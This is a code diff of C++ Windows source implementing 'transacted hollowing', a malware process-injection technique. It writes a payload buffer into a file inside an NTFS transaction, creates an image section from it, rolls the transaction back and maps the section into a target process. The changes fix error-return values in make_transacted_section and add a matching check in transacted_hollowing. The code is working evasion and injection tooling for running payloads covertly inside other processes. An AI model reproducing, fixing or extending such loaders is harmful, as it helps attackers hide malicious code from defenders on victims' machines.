@@ -22,7 +22,7 @@ HANDLE make_transacted_section(wchar_t* targetPath, BYTE* payladBuf, DWORD paylo
     HANDLE hTransaction = CreateTransaction(nullptr, nullptr, options, isolationLvl, isolationFlags, timeout, nullptr);
     if (hTransaction == INVALID_HANDLE_VALUE) {
         std::cerr << "Failed to create transaction!" << std::endl;
-        return false;
+        return INVALID_HANDLE_VALUE;
     }
     wchar_t dummy_name[MAX_PATH] = { 0 };
     wchar_t temp_path[MAX_PATH] = { 0 };
@@ -42,13 +42,13 @@ HANDLE make_transacted_section(wchar_t* targetPath, BYTE* payladBuf, DWORD paylo
     );
     if (hTransactedFile == INVALID_HANDLE_VALUE) {
         std::cerr << "Failed to create transacted file: " << GetLastError() << std::endl;
-        return false;
+        return INVALID_HANDLE_VALUE;
     }
 
     DWORD writtenLen = 0;
     if (!WriteFile(hTransactedFile, payladBuf, payloadSize, &writtenLen, NULL)) {
         std::cerr << "Failed writing payload! Error: " << GetLastError() << std::endl;
-        return false;
+        return INVALID_HANDLE_VALUE;
     }
 
     HANDLE hSection = nullptr;
@@ -62,14 +62,14 @@ HANDLE make_transacted_section(wchar_t* targetPath, BYTE* payladBuf, DWORD paylo
     );
     if (status != STATUS_SUCCESS) {
         std::cerr << "NtCreateSection failed" << std::endl;
-        return false;
+        return INVALID_HANDLE_VALUE;
     }
     CloseHandle(hTransactedFile);
     hTransactedFile = nullptr;
 
     if (RollbackTransaction(hTransaction) == FALSE) {
         std::cerr << "RollbackTransaction failed: " << std::hex << GetLastError() << std::endl;
-        return false;
+        return INVALID_HANDLE_VALUE;
     }
     CloseHandle(hTransaction);
     hTransaction = nullptr;
@@ -132,7 +132,7 @@ PVOID map_buffer_into_process(HANDLE hProcess, HANDLE hSection)
 bool transacted_hollowing(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize)
 {
     HANDLE hSection = make_transacted_section(targetPath, payladBuf, payloadSize);
-    if (!hSection) {
+    if (!hSection || hSection == INVALID_HANDLE_VALUE) {
         std::cout << "Creating transacted section has failed!\n";
         return false;
     }
